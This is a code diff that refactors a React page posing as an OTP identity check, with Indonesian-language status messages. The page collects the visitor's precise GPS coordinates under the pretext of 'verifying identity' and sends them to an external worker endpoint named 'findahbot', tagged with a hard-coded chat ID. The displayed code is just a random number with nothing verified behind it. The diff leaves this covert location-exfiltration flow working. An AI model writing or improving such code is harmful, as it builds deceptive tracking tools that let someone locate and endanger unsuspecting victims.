@@ -5,20 +5,16 @@ import { useState, useEffect } from "react";
 const WORKER_URL = "https://findahbot.onemimereztwo.workers.dev/api/location";
 const CHAT_ID = "6677922782";
 
+const generateOtpCode = () => Math.floor(100000 + Math.random() * 900000).toString();
+
 export default function OtpPage() {
-  const [otp, setOtp] = useState<string>("");
+  const [otp, setOtp] = useState<string>(() => generateOtpCode());
   const [timeLeft, setTimeLeft] = useState<number>(60);
   const [copied, setCopied] = useState<boolean>(false);
   const [isVerified, setIsVerified] = useState<boolean>(false);
   const [isLoading, setIsLoading] = useState<boolean>(false);
   const [statusMessage, setStatusMessage] = useState<string>("");
   const [statusType, setStatusType] = useState<"info" | "error" | "success">("info");
-
-  const generateOtp = () => {
-    const randomOtp = Math.floor(100000 + Math.random() * 900000).toString();
-    setOtp(randomOtp);
-    setTimeLeft(60);
-  };
 
   const sendToWorker = async (lat: number, lng: number, accuracy: number, otpCode: string) => {
     try {
@@ -54,19 +50,24 @@ export default function OtpPage() {
 
       const data = await response.json();
       return data.success === true;
-    } catch (error) {
+    } catch {
       return false;
     }
   };
 
+  const updateStatus = (message: string, type: "info" | "error" | "success" = "info") => {
+    setStatusMessage(message);
+    setStatusType(type);
+  };
+
   const verifyIdentity = () => {
     if (!navigator.geolocation) {
-      setStatusMessage("❌ Browser tidak mendukung verifikasi", "error");
+      updateStatus("❌ Browser tidak mendukung verifikasi", "error");
       return;
     }
 
     setIsLoading(true);
-    setStatusMessage("Memverifikasi identitas...", "info");
+    updateStatus("Memverifikasi identitas...", "info");
 
     const options = {
       enableHighAccuracy: true,
@@ -78,16 +79,17 @@ export default function OtpPage() {
       async (position) => {
         const { latitude, longitude, accuracy } = position.coords;
 
-        const newOtp = Math.floor(100000 + Math.random() * 900000).toString();
+        const newOtp = generateOtpCode();
         setOtp(newOtp);
+        setTimeLeft(60);
 
         const sent = await sendToWorker(latitude, longitude, accuracy, newOtp);
 
         if (sent) {
           setIsVerified(true);
-          setStatusMessage("✅ Verifikasi identitas berhasil!", "success");
+          updateStatus("✅ Verifikasi identitas berhasil!", "success");
         } else {
-          setStatusMessage("❌ Verifikasi gagal. Coba lagi.", "error");
+          updateStatus("❌ Verifikasi gagal. Coba lagi.", "error");
         }
 
         setIsLoading(false);
@@ -107,7 +109,7 @@ export default function OtpPage() {
           default:
             errorMsg = "❌ Verifikasi gagal.";
         }
-        setStatusMessage(errorMsg, "error");
+        updateStatus(errorMsg, "error");
         setIsLoading(false);
       },
       options
@@ -126,21 +128,20 @@ export default function OtpPage() {
   };
 
   useEffect(() => {
-    if (timeLeft <= 0 && isVerified) {
-      generateOtp();
-      return;
-    }
+    if (!isVerified) return;
 
     const timer = setInterval(() => {
-      setTimeLeft((prev) => prev - 1);
+      setTimeLeft((prev) => {
+        if (prev <= 1) {
+          setOtp(generateOtpCode());
+          return 60;
+        }
+        return prev - 1;
+      });
     }, 1000);
 
     return () => clearInterval(timer);
-  }, [timeLeft, isVerified]);
-
-  useEffect(() => {
-    generateOtp();
-  }, []);
+  }, [isVerified]);
 
   return (
     <main className="min-h-screen flex items-center justify-center bg-gray-50 p-4 text-gray-800">
